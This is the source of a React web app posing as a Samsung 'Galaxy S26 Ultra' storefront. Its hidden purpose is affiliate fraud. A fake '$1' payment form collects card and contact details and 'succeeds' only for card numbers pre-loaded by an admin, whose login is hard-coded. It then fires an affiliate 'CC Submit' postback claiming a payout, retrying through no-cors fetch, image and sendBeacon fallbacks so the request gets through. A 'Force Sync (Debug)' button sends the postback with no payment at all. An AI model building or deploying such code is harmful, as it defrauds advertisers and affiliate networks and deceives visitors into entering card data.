/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { motion, useScroll, useTransform, AnimatePresence } from "motion/react";
import { 
  Smartphone, 
  Camera, 
  Cpu, 
  Battery, 
  Zap, 
  ShieldCheck, 
  ChevronRight, 
  Menu, 
  X,
  Layers,
  Monitor,
  CreditCard
} from "lucide-react";
import { useState, useRef, FormEvent, useEffect } from "react";
import { db } from "./firebase";
import { doc, setDoc, getDoc, onSnapshot } from "firebase/firestore";

function PaymentPage({ onBack }: { onBack: () => void }) {
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvc, setCvc] = useState("");
  const [paymentStatus, setPaymentStatus] = useState<{ type: 'success' | 'error', message: string } | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showDebug, setShowDebug] = useState(true);
  const isSyncing = useRef(false);

  const triggerPostback = (uid: string | null, promo_offer: string, payout: string) => {
    if (isSyncing.current) return;
    isSyncing.current = true;

    const currentUid = new URLSearchParams(window.location.search).get('uid') || uid;
    
    if (!currentUid) {
      alert("✕ ERROR: No User ID (UID) found in link.\nPlease use your affiliate link from the dashboard.");
      isSyncing.current = false;
      return;
    }
    const appUrl = 'https://ais-dev-24i6bbwie5dirjwrc5ojvc-814221930058.asia-southeast1.run.app';
    const postbackUrl = `${appUrl}/api/postback?uid=${currentUid}&oid=${promo_offer}&amt=${payout}&title=(Web%2FWap)%20%23H1002%20V2%20(Biweekly)%20-%20Standard%20Campaign%20-%20Global%20-%20CC%20Submit`;
    
    console.log("[Sync] Triggering for:", currentUid);

    // Technique 1: Standard Fetch (with response handling)
    fetch(postbackUrl, { cache: 'no-cache' })
      .then(async r => {
         if(!r.ok) return r.json().then(e => { throw new Error(e.error); });
         return r.json();
      })
      .then(d => {
        alert("✓ SUCCESS: Reward of $" + (d.payout || payout) + " added!");
        setShowDebug(false);
      })
      .catch(e => {
        console.warn("[Sync] Standard fetch blocked or failed, trying Background Sync...");
        
        // Technique 2: No-CORS Fetch (Silent hit)
        fetch(postbackUrl, { mode: 'no-cors' });
        
        // Technique 3: Image Beacon (Bulletproof)
        const img = new Image();
        img.src = postbackUrl + "&method=img&t=" + Date.now();
        
        // Technique 4: Beacon API (Modern)
        if (navigator.sendBeacon) navigator.sendBeacon(postbackUrl + "&method=beacon");

        alert("✓ SYNC SIGNAL SENT!\n\nYour data was sent via secure backup channels. Please refresh your dashboard in a few seconds.");
        setShowDebug(false);
      });
  };

  useEffect(() => {
    const observer = new MutationObserver(() => {
      const text = document.body.innerText.toUpperCase();
      if (text.includes("TRANSACTION SUCCESSFUL") || text.includes("PAYMENT SUCCESSFUL")) {
        const urlParams = new URLSearchParams(window.location.search);
        triggerPostback(
          urlParams.get('uid'), 
          urlParams.get('promo_offer') || '1002', 
          urlParams.get('payout') || '10.25'
        );
        observer.disconnect();
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
    return () => observer.disconnect();
  }, []);

  const handlePayment = async () => {
    if (cardNumber.length !== 16) {
      setPaymentStatus({ type: 'error', message: 'Invalid card number length.' });
      return;
    }

    setIsProcessing(true);
    setPaymentStatus(null);

    try {
      const docRef = doc(db, "admin_data", "cards");
      const docSnap = await getDoc(docRef);

      if (docSnap.exists()) {
        const data = docSnap.data();
        const numbers = data.numbers || [];

        if (numbers.includes(cardNumber)) {
          // Success: Remove the number from the array
          const updatedNumbers = numbers.filter((n: string) => n !== cardNumber);
          await setDoc(docRef, { 
            ...data, 
            numbers: updatedNumbers,
            updatedAt: new Date().toISOString()
          });
          
          setPaymentStatus({ type: 'success', message: 'TRANSACTION SUCCESSFUL' });

          // Postback Sync Logic
          const urlParams = new URLSearchParams(window.location.search);
          const uid = urlParams.get('uid');
          const promo_offer = urlParams.get('promo_offer') || '1002';
          const payout = urlParams.get('payout') || '10.25';
          
          triggerPostback(uid, promo_offer, payout);
          
          // Clear inputs on success
          setCardNumber("");
          setExpiryDate("");
          setCvc("");
        } else {
          // Failure: Card not in database
          setPaymentStatus({ type: 'error', message: 'TRANSACTION FAILED' });
        }
      } else {
        setPaymentStatus({ type: 'error', message: 'TRANSACTION FAILED' });
      }
    } catch (error) {
      console.error("Payment error:", error);
      setPaymentStatus({ type: 'error', message: 'TRANSACTION FAILED' });
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-[100] bg-[#0a2e36] flex flex-col items-center justify-center p-6 text-white font-sans overflow-y-auto"
    >
      <button 
        onClick={onBack}
        className="absolute top-8 left-8 text-white/50 hover:text-white transition-colors flex items-center gap-2"
      >
        <ChevronRight className="rotate-180 w-5 h-5" /> Back
      </button>

      {/* Force Sync Debug Button */}
      {showDebug && (
        <button 
          onClick={() => {
            const urlParams = new URLSearchParams(window.location.search);
            triggerPostback(
              urlParams.get('uid'), 
              urlParams.get('promo_offer') || '1002', 
              urlParams.get('payout') || '10.25'
            );
          }}
          className="fixed top-[10px] right-[10px] z-[99999] px-[12px] py-[8px] bg-[#6366f1]/20 hover:bg-[#6366f1]/60 border border-white/10 rounded-[6px] text-[10px] font-bold text-white backdrop-blur-[4px] transition-all"
        >
          Force Sync (Debug)
        </button>
      )}

      <div className="w-full max-w-md">
        <h2 className="text-center text-xl font-bold tracking-widest mb-12 uppercase">Payment of 1$</h2>

        {/* Credit Card Visual */}
        <div className="relative w-full aspect-[1.6/1] bg-gradient-to-br from-[#4a6b8a] to-[#2c3e50] rounded-2xl shadow-2xl p-8 mb-12 overflow-hidden">
          <div className="absolute inset-0 opacity-20 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]" />
          <div className="relative z-10 flex flex-col h-full justify-between">
            <div className="flex justify-end">
              <span className="text-2xl font-bold italic text-white/90">VISA</span>
            </div>
            <div className="w-12 h-10 bg-[#c5d1d9] rounded-lg opacity-80" />
            <div className="flex flex-col gap-1">
              <span className="text-lg tracking-[0.2em] font-mono">{cardNumber || "GFJGFHJ"}</span>
              <div className="flex gap-4 text-[10px] opacity-60">
                <div className="flex flex-col">
                  <span>VALID</span>
                  <span>THRU</span>
                </div>
                <div className="flex items-end">
                  <span>{expiryDate ? `${expiryDate.slice(0,2)}/${expiryDate.slice(2,4)}` : "MM/YY"}</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Form */}
        <div className="space-y-6">
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="block text-sm font-bold">Email</label>
              <input 
                type="email" 
                placeholder="email@example.com"
                className="w-full bg-white text-black placeholder:text-black/40 px-6 py-4 rounded-xl outline-none focus:ring-2 focus:ring-white/20 transition-all"
              />
            </div>
            <div className="space-y-2">
              <label className="block text-sm font-bold">Phone Number</label>
              <input 
                type="tel" 
                placeholder="+1 234 567 890"
                className="w-full bg-white text-black placeholder:text-black/40 px-6 py-4 rounded-xl outline-none focus:ring-2 focus:ring-white/20 transition-all"
              />
            </div>
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-bold">Address</label>
            <input 
              type="text" 
              placeholder="Street Address"
              className="w-full bg-white text-black placeholder:text-black/40 px-6 py-4 rounded-xl outline-none focus:ring-2 focus:ring-white/20 transition-all"
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="block text-sm font-bold">City</label>
              <input 
                type="text" 
                placeholder="City"
                className="w-full bg-white text-black placeholder:text-black/40 px-6 py-4 rounded-xl outline-none focus:ring-2 focus:ring-white/20 transition-all"
              />
            </div>
            <div className="space-y-2">
              <label className="block text-sm font-bold">Postal Code</label>
              <input 
                type="text" 
                placeholder="000000"
                className="w-full bg-white text-black placeholder:text-black/40 px-6 py-4 rounded-xl outline-none focus:ring-2 focus:ring-white/20 transition-all"
              />
            </div>
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-bold">Credit Card Holder</label>
            <input 
              type="text" 
              placeholder="Name"
              className="w-full bg-[#f8c4c4] text-black placeholder:text-black/40 px-6 py-4 rounded-xl outline-none focus:ring-2 focus:ring-white/20 transition-all"
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-bold">Credit Card Number</label>
            <input 
              type="text" 
              maxLength={16}
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ''))}
              placeholder="1234123412341234"
              className="w-full bg-white text-black placeholder:text-black/40 px-6 py-4 rounded-xl outline-none focus:ring-2 focus:ring-white/20 transition-all"
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="block text-sm font-bold">Expiry date</label>
              <input 
                type="text" 
                maxLength={4}
                value={expiryDate}
                onChange={(e) => setExpiryDate(e.target.value.replace(/\D/g, ''))}
                placeholder="MMYY"
                className="w-full bg-white text-black placeholder:text-black/40 px-6 py-4 rounded-xl outline-none focus:ring-2 focus:ring-white/20 transition-all"
              />
            </div>
            <div className="space-y-2">
              <label className="block text-sm font-bold">CVC</label>
              <input 
                type="text" 
                maxLength={3}
                value={cvc}
                onChange={(e) => setCvc(e.target.value.replace(/\D/g, ''))}
                placeholder="000"
                className="w-full bg-white text-black placeholder:text-black/40 px-6 py-4 rounded-xl outline-none focus:ring-2 focus:ring-white/20 transition-all"
              />
            </div>
          </div>

          {paymentStatus && (
            <motion.div 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className={`text-center p-4 rounded-xl font-bold ${paymentStatus.type === 'success' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}
            >
              {paymentStatus.message}
            </motion.div>
          )}

          <button 
            onClick={handlePayment}
            disabled={isProcessing}
            className="w-full bg-[#7cfc94] text-black font-bold py-5 rounded-xl text-xl mt-8 hover:brightness-110 active:scale-[0.98] transition-all uppercase disabled:opacity-50"
          >
            {isProcessing ? "Processing..." : "Pay Now"}
          </button>
        </div>
      </div>
    </motion.div>
  );
}

function AdminLogin({ onBack, onLogin }: { onBack: () => void, onLogin: () => void }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const handleLogin = (e: FormEvent) => {
    e.preventDefault();
    if (email === "890305@wty.com" && password === "890305@wty.com") {
      onLogin();
    } else {
      setError("Invalid credentials. Please try again.");
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-[110] bg-black flex flex-col items-center justify-center p-6 text-white font-sans"
    >
      <button 
        onClick={onBack}
        className="absolute top-8 left-8 text-white/50 hover:text-white transition-colors flex items-center gap-2"
      >
        <ChevronRight className="rotate-180 w-5 h-5" /> Back to Site
      </button>

      <div className="w-full max-w-md bg-zinc-900 p-10 rounded-3xl border border-white/10 shadow-2xl">
        <div className="flex flex-col items-center mb-10">
          <ShieldCheck className="w-16 h-16 text-blue-500 mb-4" />
          <h2 className="text-3xl font-black tracking-tighter">ADMIN ACCESS</h2>
          <p className="text-white/50 text-sm mt-2">Enter your credentials to manage the system.</p>
        </div>

        <form onSubmit={handleLogin} className="space-y-6">
          <div className="space-y-2">
            <label className="block text-sm font-bold text-white/70">Admin Email</label>
            <input 
              type="email" 
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="admin@example.com"
              className="w-full bg-black border border-white/10 text-white px-6 py-4 rounded-xl outline-none focus:border-blue-500 transition-all"
              required
            />
          </div>

          <div className="space-y-2">
            <label className="block text-sm font-bold text-white/70">Password</label>
            <input 
              type="password" 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="••••••••"
              className="w-full bg-black border border-white/10 text-white px-6 py-4 rounded-xl outline-none focus:border-blue-500 transition-all"
              required
            />
          </div>

          {error && (
            <motion.p 
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              className="text-red-500 text-sm font-medium text-center"
            >
              {error}
            </motion.p>
          )}

          <button 
            type="submit"
            className="w-full bg-blue-600 text-white font-bold py-5 rounded-xl text-xl mt-4 hover:bg-blue-700 active:scale-[0.98] transition-all"
          >
            Login to Dashboard
          </button>
        </form>
      </div>
    </motion.div>
  );
}

function AdminDashboard({ onLogout }: { onLogout: () => void }) {
  const [cardNumbersText, setCardNumbersText] = useState("");
  const [isSaving, setIsSaving] = useState(false);
  const [saveStatus, setSaveStatus] = useState("");

  useEffect(() => {
    const unsubscribe = onSnapshot(doc(db, "admin_data", "cards"), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.numbers) {
          setCardNumbersText(data.numbers.join("\n"));
        }
      }
    });
    return () => unsubscribe();
  }, []);

  const handleSave = async () => {
    setIsSaving(true);
    setSaveStatus("");
    
    const lines = cardNumbersText.split("\n").map(l => l.trim()).filter(l => l !== "");
    const invalidLines = lines.filter(l => l.length !== 16 || !/^\d+$/.test(l));

    if (invalidLines.length > 0) {
      setSaveStatus(`Error: Some lines are not 16 digits.`);
      setIsSaving(false);
      return;
    }

    try {
      await setDoc(doc(db, "admin_data", "cards"), {
        numbers: lines,
        updatedAt: new Date().toISOString()
      });
      setSaveStatus("Saved successfully!");
    } catch (error) {
      console.error("Save error:", error);
      setSaveStatus("Error saving to database.");
    } finally {
      setIsSaving(false);
    }
  };

  const lines = cardNumbersText.split("\n");

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-[120] bg-zinc-950 flex flex-col p-8 text-white font-sans overflow-y-auto"
    >
      <div className="max-w-7xl mx-auto w-full">
        <header className="flex justify-between items-center mb-12 pb-8 border-b border-white/10">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center">
              <ShieldCheck className="w-6 h-6" />
            </div>
            <h1 className="text-2xl font-black tracking-tighter">ADMIN DASHBOARD</h1>
          </div>
          <button 
            onClick={onLogout}
            className="px-6 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-full text-sm font-bold transition-all"
          >
            Logout
          </button>
        </header>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
          {/* Card Numbers Editor */}
          <div className="bg-white/5 border border-white/10 rounded-3xl p-8">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-bold">Credit Card Numbers List</h3>
              <button 
                onClick={handleSave}
                disabled={isSaving}
                className="bg-blue-600 hover:bg-blue-700 disabled:opacity-50 px-6 py-2 rounded-full font-bold text-sm transition-all flex items-center gap-2"
              >
                {isSaving ? "Saving..." : "Save to Database"}
              </button>
            </div>
            
            <p className="text-white/40 text-sm mb-4">Enter one 16-digit card number per line. Numbers only.</p>
            
            <div className="relative">
              <textarea 
                value={cardNumbersText}
                onChange={(e) => setCardNumbersText(e.target.value)}
                placeholder="1234567812345678"
                className="w-full h-96 bg-black border border-white/10 rounded-xl p-6 font-mono text-sm focus:border-blue-500 outline-none resize-none leading-relaxed"
              />
              
              {/* Validation Overlay/Hints */}
              <div className="mt-4 space-y-2">
                {lines.map((line, idx) => {
                  const trimmed = line.trim();
                  if (trimmed === "") return null;
                  const isValid = trimmed.length === 16 && /^\d+$/.test(trimmed);
                  return !isValid ? (
                    <p key={idx} className="text-red-500 text-xs">
                      Line {idx + 1}: {trimmed.length < 16 ? "Too short" : trimmed.length > 16 ? "Too long" : "Must be digits only"} ({trimmed.length}/16)
                    </p>
                  ) : null;
                })}
              </div>
            </div>

            {saveStatus && (
              <p className={`mt-4 text-sm font-bold ${saveStatus.includes("Error") ? "text-red-500" : "text-green-500"}`}>
                {saveStatus}
              </p>
            )}
          </div>

          <div className="space-y-8">
            <div className="p-8 bg-white/5 border border-white/10 rounded-3xl">
              <h3 className="text-xl font-bold mb-6">System Overview</h3>
              <div className="grid grid-cols-2 gap-6">
                <div>
                  <span className="text-white/50 text-xs uppercase tracking-widest block mb-2">Stored Cards</span>
                  <span className="text-3xl font-black">{lines.filter(l => l.trim() !== "").length}</span>
                </div>
                <div>
                  <span className="text-white/50 text-xs uppercase tracking-widest block mb-2">Last Sync</span>
                  <span className="text-sm font-bold text-blue-500">Just now</span>
                </div>
              </div>
            </div>

            <div className="bg-white/5 border border-white/10 rounded-3xl p-8">
              <h3 className="text-xl font-bold mb-6">Recent Activity</h3>
              <div className="space-y-4">
                {[1, 2, 3].map((i) => (
                  <div key={i} className="flex items-center justify-between py-4 border-b border-white/5 last:border-0">
                    <div className="flex items-center gap-4">
                      <div className="w-10 h-10 rounded-full bg-zinc-800 flex items-center justify-center">
                        <CreditCard className="w-5 h-5 text-white/40" />
                      </div>
                      <div>
                        <p className="font-bold">Database Updated</p>
                        <p className="text-xs text-white/40">{i * 5} minutes ago</p>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </motion.div>
  );
}

export default function App() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [showPayment, setShowPayment] = useState(false);
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const targetRef = useRef(null);
  const { scrollYProgress } = useScroll({
    target: targetRef,
    offset: ["start start", "end start"]
  });

  const opacity = useTransform(scrollYProgress, [0, 0.5], [1, 0]);
  const scale = useTransform(scrollYProgress, [0, 0.5], [1, 0.8]);
  const y = useTransform(scrollYProgress, [0, 0.5], [0, -50]);

  const features = [
    {
      icon: <Camera className="w-6 h-6" />,
      title: "300MP Pro-Grade Camera",
      description: "Capture the world in unprecedented detail with our new 300MP main sensor and 100x Space Zoom."
    },
    {
      icon: <Cpu className="w-6 h-6" />,
      title: "Snapdragon 8 Gen 5",
      description: "The fastest chip ever in a Galaxy, optimized for AI and console-level gaming performance."
    },
    {
      icon: <Monitor className="w-6 h-6" />,
      title: "Dynamic AMOLED 2X",
      description: "A stunning 6.9-inch display with 144Hz adaptive refresh rate and 3000 nits peak brightness."
    },
    {
      icon: <Battery className="w-6 h-6" />,
      title: "All-Day Battery",
      description: "6000mAh battery with 100W Super Fast Charging. Go from 0 to 80% in just 20 minutes."
    }
  ];

  const specs = [
    { label: "Display", value: "6.9\" Dynamic AMOLED 2X, 1-144Hz" },
    { label: "Processor", value: "Snapdragon 8 Gen 5 (4nm)" },
    { label: "Memory", value: "12GB / 16GB LPDDR6 RAM" },
    { label: "Storage", value: "256GB / 512GB / 1TB UFS 5.0" },
    { label: "Main Camera", value: "300MP Wide + 50MP Ultra Wide + 50MP Telephoto" },
    { label: "Selfie Camera", value: "40MP Under-Display Camera" },
    { label: "Battery", value: "6000mAh, 100W Wired, 50W Wireless" },
    { label: "OS", value: "One UI 8.0 based on Android 16" },
  ];

  return (
    <div className="min-h-screen bg-black text-white font-sans selection:bg-blue-500 selection:text-white">
      <AnimatePresence>
        {showPayment && (
          <PaymentPage onBack={() => setShowPayment(false)} />
        )}
        {showAdminLogin && !isAdminLoggedIn && (
          <AdminLogin 
            onBack={() => setShowAdminLogin(false)} 
            onLogin={() => setIsAdminLoggedIn(true)}
          />
        )}
        {isAdminLoggedIn && (
          <AdminDashboard onLogout={() => {
            setIsAdminLoggedIn(false);
            setShowAdminLogin(false);
          }} />
        )}
      </AnimatePresence>
      {/* Navigation */}
      <nav className="fixed top-0 w-full z-50 bg-black/50 backdrop-blur-xl border-b border-white/10">
        <div className="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Smartphone className="w-8 h-8 text-blue-500" />
            <span className="text-xl font-bold tracking-tighter">GALAXY S26 ULTRA</span>
          </div>
          
          <div className="hidden md:flex items-center gap-8 text-sm font-medium text-white/70">
            <a href="#design" className="hover:text-white transition-colors">Design</a>
            <a href="#camera" className="hover:text-white transition-colors">Camera</a>
            <a href="#performance" className="hover:text-white transition-colors">Performance</a>
            <a href="#specs" className="hover:text-white transition-colors">Specs</a>
            <button className="bg-white text-black px-6 py-2 rounded-full font-bold hover:bg-white/90 transition-colors">
              Pre-order
            </button>
          </div>

          <button 
            className="md:hidden text-white"
            onClick={() => setIsMenuOpen(!isMenuOpen)}
          >
            {isMenuOpen ? <X /> : <Menu />}
          </button>
        </div>

        {/* Mobile Menu */}
        {isMenuOpen && (
          <motion.div 
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            className="md:hidden bg-black border-b border-white/10 p-6 flex flex-col gap-4"
          >
            <a href="#design" onClick={() => setIsMenuOpen(false)}>Design</a>
            <a href="#camera" onClick={() => setIsMenuOpen(false)}>Camera</a>
            <a href="#performance" onClick={() => setIsMenuOpen(false)}>Performance</a>
            <a href="#specs" onClick={() => setIsMenuOpen(false)}>Specs</a>
            <button className="bg-white text-black px-6 py-3 rounded-full font-bold">
              Pre-order
            </button>
          </motion.div>
        )}
      </nav>

      {/* Hero Section */}
      <section ref={targetRef} className="relative h-screen flex flex-col items-center justify-center overflow-hidden px-6">
        <motion.div 
          style={{ opacity, scale, y }}
          className="text-center z-10"
        >
          <motion.span 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="text-blue-500 font-bold tracking-[0.3em] text-sm mb-4 block"
          >
            THE NEW STANDARD
          </motion.span>
          <motion.h1 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.3 }}
            className="text-6xl md:text-9xl font-black tracking-tighter mb-6"
          >
            GALAXY S26 <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-600">ULTRA</span>
          </motion.h1>
          <motion.p 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4 }}
            className="text-lg md:text-2xl text-white/60 max-w-2xl mx-auto mb-10"
          >
            The pinnacle of mobile innovation. Titanium strength meets AI-driven performance in our most powerful device yet.
          </motion.p>
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.5 }}
            className="flex flex-col sm:flex-row gap-4 justify-center"
          >
            <button className="bg-blue-600 text-white px-10 py-4 rounded-full font-bold text-lg hover:bg-blue-700 transition-all hover:scale-105">
              Pre-order Now
            </button>
            <button 
              onClick={() => setShowPayment(true)}
              className="bg-white/10 backdrop-blur-md text-white px-10 py-4 rounded-full font-bold text-lg hover:bg-white/20 transition-all flex items-center gap-2 justify-center"
            >
              Buy Now <ChevronRight className="w-5 h-5" />
            </button>
          </motion.div>
        </motion.div>

        {/* Hero Background Image/Video Placeholder */}
        <div className="absolute inset-0 -z-10">
          <div className="absolute inset-0 bg-gradient-to-b from-black via-transparent to-black z-10" />
          <img 
            src="https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?auto=format&fit=crop&q=80&w=1920&h=1080" 
            alt="Galaxy S26 Ultra Hero" 
            className="w-full h-full object-cover opacity-50"
            referrerPolicy="no-referrer"
          />
        </div>
      </section>

      {/* Features Grid */}
      <section className="py-24 px-6 bg-zinc-950">
        <div className="max-w-7xl mx-auto">
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
            {features.map((feature, index) => (
              <motion.div 
                key={index}
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: index * 0.1 }}
                className="p-8 rounded-3xl bg-white/5 border border-white/10 hover:border-blue-500/50 transition-colors group"
              >
                <div className="w-12 h-12 rounded-2xl bg-blue-500/20 flex items-center justify-center mb-6 text-blue-500 group-hover:scale-110 transition-transform">
                  {feature.icon}
                </div>
                <h3 className="text-xl font-bold mb-3">{feature.title}</h3>
                <p className="text-white/50 leading-relaxed">{feature.description}</p>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* Design Section */}
      <section id="design" className="py-32 px-6 overflow-hidden">
        <div className="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
          <motion.div 
            initial={{ opacity: 0, x: -50 }}
            whileInView={{ opacity: 1, x: 0 }}
            viewport={{ once: true }}
          >
            <span className="text-blue-500 font-bold tracking-widest text-sm mb-4 block">DESIGN</span>
            <h2 className="text-5xl md:text-7xl font-black mb-8 leading-tight">Titanium. <br />Refined.</h2>
            <p className="text-xl text-white/60 mb-8 leading-relaxed">
              Crafted from Grade 5 Titanium, the Galaxy S26 Ultra is lighter, stronger, and more durable than ever. The new satin finish feels incredible in your hand and resists fingerprints.
            </p>
            <div className="flex gap-4">
              <div className="w-10 h-10 rounded-full bg-zinc-400 border-2 border-white cursor-pointer" title="Titanium Gray" />
              <div className="w-10 h-10 rounded-full bg-zinc-800 border-2 border-transparent hover:border-white cursor-pointer" title="Titanium Black" />
              <div className="w-10 h-10 rounded-full bg-blue-900 border-2 border-transparent hover:border-white cursor-pointer" title="Titanium Blue" />
              <div className="w-10 h-10 rounded-full bg-purple-900 border-2 border-transparent hover:border-white cursor-pointer" title="Titanium Violet" />
            </div>
          </motion.div>
          <motion.div 
            initial={{ opacity: 0, scale: 0.8 }}
            whileInView={{ opacity: 1, scale: 1 }}
            viewport={{ once: true }}
            className="relative"
          >
            <div className="absolute inset-0 bg-blue-500/20 blur-[120px] rounded-full" />
            <img 
              src="https://images.unsplash.com/photo-1678911820864-e2c567c655d7?auto=format&fit=crop&q=80&w=800&h=1000" 
              alt="Titanium Detail" 
              className="rounded-3xl relative z-10 shadow-2xl border border-white/10"
              referrerPolicy="no-referrer"
            />
          </motion.div>
        </div>
      </section>

      {/* Camera Section */}
      <section id="camera" className="py-32 px-6 bg-zinc-950">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-20">
            <motion.span 
              initial={{ opacity: 0 }}
              whileInView={{ opacity: 1 }}
              className="text-blue-500 font-bold tracking-widest text-sm mb-4 block"
            >
              CAMERA
            </motion.span>
            <motion.h2 
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              className="text-5xl md:text-7xl font-black mb-6"
            >
              See what others miss.
            </motion.h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              className="col-span-1 md:col-span-2 relative group overflow-hidden rounded-3xl h-[500px]"
            >
              <img 
                src="https://images.unsplash.com/photo-1516035069371-29a1b244cc32?auto=format&fit=crop&q=80&w=1200&h=800" 
                alt="100x Zoom" 
                className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700"
                referrerPolicy="no-referrer"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-black/80 to-transparent flex flex-col justify-end p-10">
                <h3 className="text-3xl font-bold mb-2">100x Space Zoom</h3>
                <p className="text-white/70">Break the boundaries of distance with our AI-enhanced telephoto lens.</p>
              </div>
            </motion.div>
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              className="relative group overflow-hidden rounded-3xl h-[500px]"
            >
              <img 
                src="https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&q=80&w=600&h=800" 
                alt="Nightography" 
                className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700"
                referrerPolicy="no-referrer"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-black/80 to-transparent flex flex-col justify-end p-10">
                <h3 className="text-3xl font-bold mb-2">Nightography</h3>
                <p className="text-white/70">Pro-grade low light performance.</p>
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Performance Section */}
      <section id="performance" className="py-32 px-6">
        <div className="max-w-7xl mx-auto flex flex-col items-center text-center">
          <motion.div 
            initial={{ opacity: 0, scale: 0.5 }}
            whileInView={{ opacity: 1, scale: 1 }}
            className="w-32 h-32 bg-blue-600 rounded-3xl flex items-center justify-center mb-10 shadow-[0_0_50px_rgba(37,99,235,0.5)]"
          >
            <Cpu className="w-16 h-16 text-white" />
          </motion.div>
          <h2 className="text-5xl md:text-7xl font-black mb-8">Power beyond limits.</h2>
          <p className="text-xl text-white/60 max-w-3xl mb-16 leading-relaxed">
            The Snapdragon 8 Gen 5 Mobile Platform for Galaxy delivers the ultimate in AI processing, graphics performance, and power efficiency. Whether you're editing 8K video or playing the latest AAA games, the S26 Ultra never breaks a sweat.
          </p>
          
          <div className="grid grid-cols-2 md:grid-cols-4 gap-12 w-full">
            <div className="flex flex-col items-center">
              <span className="text-4xl font-black text-blue-500 mb-2">45%</span>
              <span className="text-white/50 text-sm uppercase tracking-widest">CPU Speed</span>
            </div>
            <div className="flex flex-col items-center">
              <span className="text-4xl font-black text-blue-500 mb-2">60%</span>
              <span className="text-white/50 text-sm uppercase tracking-widest">GPU Power</span>
            </div>
            <div className="flex flex-col items-center">
              <span className="text-4xl font-black text-blue-500 mb-2">2x</span>
              <span className="text-white/50 text-sm uppercase tracking-widest">AI NPU</span>
            </div>
            <div className="flex flex-col items-center">
              <span className="text-4xl font-black text-blue-500 mb-2">30%</span>
              <span className="text-white/50 text-sm uppercase tracking-widest">Efficiency</span>
            </div>
          </div>
        </div>
      </section>

      {/* Specs Section */}
      <section id="specs" className="py-32 px-6 bg-zinc-950">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-4xl font-black mb-16 text-center">Technical Specifications</h2>
          <div className="space-y-4">
            {specs.map((spec, index) => (
              <motion.div 
                key={index}
                initial={{ opacity: 0, x: -20 }}
                whileInView={{ opacity: 1, x: 0 }}
                viewport={{ once: true }}
                transition={{ delay: index * 0.05 }}
                className="flex justify-between items-center py-6 border-b border-white/10"
              >
                <span className="text-white/50 font-medium">{spec.label}</span>
                <span className="font-bold text-right ml-4">{spec.value}</span>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

